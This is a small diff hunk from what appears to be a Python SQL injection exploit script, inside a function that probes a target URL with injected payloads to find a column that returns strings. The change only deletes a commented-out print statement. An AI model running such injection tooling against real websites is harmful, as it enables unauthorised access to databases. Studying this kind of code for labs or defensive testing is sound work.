@@ -27,7 +27,6 @@ def exploit_sqli_string_field(url, num_col):
         r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
         print(url+path+sql_payload)
         res = r.text
-        # print(res)
         if string.strip('\'') in res:
             return i
     return False
